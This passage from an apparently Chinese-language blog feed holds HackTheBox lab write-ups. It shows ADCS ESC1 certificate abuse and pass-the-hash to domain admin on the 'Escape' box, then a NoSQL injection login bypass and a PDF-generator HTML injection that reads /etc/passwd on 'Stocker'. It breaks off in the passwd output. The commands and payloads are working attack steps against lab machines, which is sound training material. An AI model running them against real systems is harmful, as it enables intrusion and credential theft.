class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: sequel\Administrator (SidTypeUser)</span><br><span class="line">501: sequel\Guest (SidTypeUser)</span><br><span class="line">502: sequel\krbtgt (SidTypeUser)</span><br><span class="line">512: sequel\Domain Admins (SidTypeGroup)</span><br><span class="line">513: sequel\Domain Users (SidTypeGroup)</span><br><span class="line">514: sequel\Domain Guests (SidTypeGroup)</span><br><span class="line">515: sequel\Domain Computers (SidTypeGroup)</span><br><span class="line">516: sequel\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: sequel\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: sequel\Schema Admins (SidTypeGroup)</span><br><span class="line">519: sequel\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: sequel\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: sequel\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: sequel\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: sequel\Protected Users (SidTypeGroup)</span><br><span class="line">526: sequel\Key Admins (SidTypeGroup)</span><br><span class="line">527: sequel\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: sequel\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: sequel\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: sequel\DC$ (SidTypeUser)</span><br><span class="line">1101: sequel\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: sequel\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: sequel\Tom.Henn (SidTypeUser)</span><br><span class="line">1104: sequel\Brandon.Brown (SidTypeUser)</span><br><span class="line">1105: sequel\Ryan.Cooper (SidTypeUser)</span><br><span class="line">1106: sequel\sql_svc (SidTypeUser)</span><br><span class="line">1107: sequel\James.Roberts (SidTypeUser)</span><br><span class="line">1108: sequel\Nicole.Thompson (SidTypeUser)</span><br><span class="line">1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</span><br></pre></td></tr></table></figure><p>用户名<code>NuclearMosquito3</code>并不存在</p><p>尝试将<code>NuclearMosquito3</code>作为<code>ryan.cooper</code>用户的密码登入winrm服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\ryan.cooper\desktop\user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0cbcb92fcd258be421cbdfbadaebd0bf</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><blockquote><p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br /><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure><p>该程序v4.3.0版本在python3.11环境无法正常运行</p><p>查询是否存在错误配置的证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC-CA</span><br><span class="line">    DNS Name                            : dc.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00</span><br><span class="line">    Certificate Validity End            : 2121-11-18 21:08:46+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : UserAuthentication</span><br><span class="line">    Display Name                        : UserAuthentication</span><br><span class="line">    Certificate Authorities             : sequel-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : 16777216</span><br><span class="line">                                          65536</span><br><span class="line">                                          ExportableKey</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Encrypting File System</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 10 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Domain Users</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>模板名为<code>UserAuthentication</code>, CA为<code>sequel-DC-CA</code></p><p>错误配置证书模板的配置条件为以下三点，分别对应任意证书申请对象，证书可用于AD，证书申请者为经验证的域用户</p><ul><li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</li><li>PkiExtendedKeyUsage: Client Authentication</li><li>Enrollment Rights: Authenticated Users</li></ul><p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure><p>证书名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator.pfx</span><br></pre></td></tr></table></figure><p>同步时间</p><p>使用证书通过Kerberos生成TGT并还原为NT Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.11.202 &amp;&amp; certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><p>得到Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure><p>Hash传递登入winrm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a54e5111794f55e2445b72fdcc3291d6</span><br></pre></td></tr></table></figure><hr /><blockquote><p>openvpn与Kerberos的竞争</p></blockquote><p>靶机的CST比现实的快了8个小时，所以自然就有了以下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br></pre></td></tr></table></figure><p>原以为一条命令就能解决的事情</p><p><code>ntpdate -u 10.10.11.202</code></p><p>毕竟之前（一年半以前）也碰到过类似的情况</p><p>然而命令并没有生效</p><p>确切来讲是生效几秒后就会自动调回去</p><p>结合另外一个正在运行openvpn的窗口总是在我运行时间同步命令的时候重连vpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[htb] Inactivity timeout (--ping-restart), restarting</span><br></pre></td></tr></table></figure><p>所以这就是问题所在，大概是opevpn也要做时间同步</p><p>但是所幸openvpn的时间同步有一段间隔时间</p><p>多试几次卡在间隔时间跑完命令就行</p><p>估计是openvpn的更新加了这个功能，下次遇到再看看怎么调参数忽略openvpn的时间同步吧</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;域渗透水平还是一如既往的差&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Stocker</title>
    <link href="https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/"/>
    <id>https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/</id>
    <published>2023-03-07T03:31:16.000Z</published>
    <updated>2023-03-07T16:38:19.785Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_stocker"><a class="markdownIt-Anchor" href="#hackthebox_stocker"></a> HackTheBox_Stocker</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.196</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.196</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 528 closed ports, 470 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.196/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Tue, 07 Mar 2023 11:42:59 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;stocker.htb</span><br></pre></td></tr></table></figure><p>跳转至域名<code>stocker.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.196\tstocker.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径未得到有效信息</p><h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3><p>生成VHOST列表</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vhost.py</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt&quot;</span>)</span><br><span class="line">data = file.read().split()</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">print(<span class="string">&quot;10.10.11.196\t%s.stocker.htb&quot;</span> % _)</span><br></pre></td></tr></table></figure><p>备份hosts文件并生成新hosts文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/hosts /etc/hosts.bak</span><br><span class="line">python vhost.py &gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>VHOST扫描程序如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scan.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/etc/hosts&quot;</span>)</span><br><span class="line">data_list = file.read().replace(<span class="string">&quot;10.10.11.196\t&quot;</span>, <span class="string">&quot;&quot;</span>).split()</span><br><span class="line">file.close()</span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enum</span>():</span></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(data_list):</span><br><span class="line">tmp_vhost = data_list[index]</span><br><span class="line">index += <span class="number">1</span></span><br><span class="line">print(index)</span><br><span class="line">res = req.get(<span class="string">&quot;http://%s/&quot;</span> % tmp_vhost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers <span class="keyword">or</span> res.headers[<span class="string">&quot;Location&quot;</span>] != <span class="string">&quot;http://stocker.htb&quot;</span>:</span><br><span class="line">print(tmp_vhost)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">t = threading.Thread(target=enum)</span><br><span class="line">threads.append(t)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure><p>扫描得到VHOST信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev.stocker.htb</span><br></pre></td></tr></table></figure><p>还原hosts文件并添加hosts信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;etc&#x2F;hosts</span><br><span class="line">mv &#x2F;etc&#x2F;hosts.bak &#x2F;etc&#x2F;hosts</span><br><span class="line">echo -e &quot;10.10.11.196\tdev.stocker.htb&quot; &gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问<code>dev.stocker.htb</code></p><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql">https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a></p></blockquote><p>NoSQL注入绕过登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* Connected to dev.stocker.htb (154.38.66.218) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: dev.stocker.htb</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Content-Type: application&#x2F;json</span><br><span class="line">&gt; Accept: application&#x2F;json</span><br><span class="line">&gt; Content-Length: 55</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Tue, 07 Mar 2023 14:16:51 GMT</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Location: &#x2F;stock</span><br><span class="line">&lt; Vary: Accept</span><br><span class="line">&lt; Set-Cookie: connect.sid&#x3D;s%3AfJIaR20mVzvQQCGTeOLbI_uzbKaqBhDQ.1iY7jjKTmOGErnDSTPrCaAgRhmuV8m0NpczGe67RCfg; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host dev.stocker.htb left intact</span><br></pre></td></tr></table></figure><p>商品加入购物车并支付后生成订单PDF文件<br />下载后查看exif信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool 64074bcafc5e45f83e5036a5.pdf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.49</span><br><span class="line">File Name                       : 64074bcafc5e45f83e5036a5.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 39 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:07 09:36:19-05:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:07 09:36:31-05:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:07 09:36:32-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Tagged PDF                      : Yes</span><br><span class="line">Creator                         : Chromium</span><br><span class="line">Producer                        : Skia&#x2F;PDF m108</span><br><span class="line">Create Date                     : 2023:03:07 14:36:05+00:00</span><br><span class="line">Modify Date                     : 2023:03:07 14:36:05+00:00</span><br></pre></td></tr></table></figure><p>Skia/PDF XSS to SSRF</p><blockquote><p><a href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p></blockquote><p>修改订单信息如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line"><span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line"><span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe style=&#x27;width: 1000px;height: 1000px;&#x27; src=file:///etc/passwd&gt; &quot;</span>,</span><br><span class="line"><span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line"><span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line"><span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line"><span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成订单PDF文件即可触发SSRF漏洞并获取/etc/passwd信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 